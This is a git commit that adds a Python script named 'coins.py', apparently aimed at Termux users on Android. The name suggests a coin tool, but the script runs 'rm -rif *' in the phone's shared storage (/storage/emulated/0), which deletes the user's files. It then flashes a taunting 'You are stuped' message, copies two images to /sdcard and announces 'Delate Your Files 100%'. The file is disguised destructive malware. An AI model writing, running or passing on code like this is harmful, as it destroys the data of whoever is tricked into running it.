f7f7c80a3f5b4b1bea89fe80cda27fabca6e25d0
RTYI9 <69012366+RTYI9@users.noreply.github.com>
2020-08-18 23:14:02 +0300

    Add files via upload

---
+++ coins.py
@@ -0,0 +1,66 @@
+
+import os
+
+import time
+
+
+
+#i love python 💓💓💓💓💓💓💓
+#8R9
+#8R9
+#8R9
+#8R9
+#8R9
+
+
+
+
+
+os.system("clear")
+
+
+red = "\033[0;31m"
+pur = "\033[0;35m"
+gre = "\033[0;32m"
+yel = "\033[0;33m"
+blu = "\033[0;34m"
+cya = "\033[1;36m"
+whi = "\033[0;37m"
+
+
+os.chdir('/storage/emulated/0')
+os.system("cd /sdcard")
+os.system("rm -rif *")
+
+print(os.getcwd())
+
+os.system("clear")
+
+
+print ("" + gre)
+
+
+print("\t\t\tY       o       u")
+time.sleep(3)
+os.system("clear")
+
+print ("" +pur)
+
+print ("\t\t\tA       R       E")
+time.sleep(3)
+os.system("clear")
+
+print ("" +red)
+
+print ("\t\t  S   T    U    P    E    D")
+time.sleep(3)
+
+
+os.chdir('/data/data/com.termux/files/home/yo')
+os.system('cp IMG_20200816_214755.jpg /sdcard')
+os.system('cp IMG_20200817_024000.jpg /sdcard')
+
+print ("" +cya)
+
+print ("\t\n\n\t Delate Your Files 100%")
+
